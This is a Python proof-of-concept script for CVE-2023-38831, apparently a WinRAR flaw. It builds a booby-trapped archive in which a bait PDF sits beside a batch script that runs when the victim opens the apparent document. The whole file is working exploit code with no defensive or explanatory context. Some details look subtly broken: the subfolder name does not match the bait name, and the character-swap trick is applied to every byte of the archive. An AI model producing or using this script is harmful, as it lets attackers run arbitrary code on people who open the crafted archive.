import shutil
import os

def exploit():
    print("CVE-2023-38831 POC")
    print("-------------------------------")

    bait_file = 'document.pdf'
    script_file = 'script.bat'
    output_file = 'example.rar'

    if not os.path.exists(bait_file):
        print(f"Error: {bait_file} does not exist.")
        return
    if not os.path.exists(script_file):
        print(f"Error: {script_file} does not exist.")
        return

    if not output_file.endswith(".rar"):
        output_file += ".rar"

    template = "tmp"
    if os.path.exists(template):
        shutil.rmtree(template)
    os.mkdir(template)

    fake_bait = 'document.pdfA'
    d = os.path.join(template, 'd0cum6nt')
    os.mkdir(d)

    shutil.copyfile(script_file, os.path.join(d, fake_bait + ".bat"))
    shutil.copyfile(bait_file, os.path.join(template, bait_file + "B"))

    shutil.make_archive(template, 'zip', template)
    with open(template + ".zip", "rb") as f:
        content = f.read()
        content = content.replace(b"A", b" ")
        content = content.replace(b"B", b" ")
    os.remove(template + ".zip")

    with open(output_file, "wb") as f:
        f.write(content)

    print(f"Exploit generated successfully as '{output_file}'.")

if __name__ == "__main__":
    exploit()
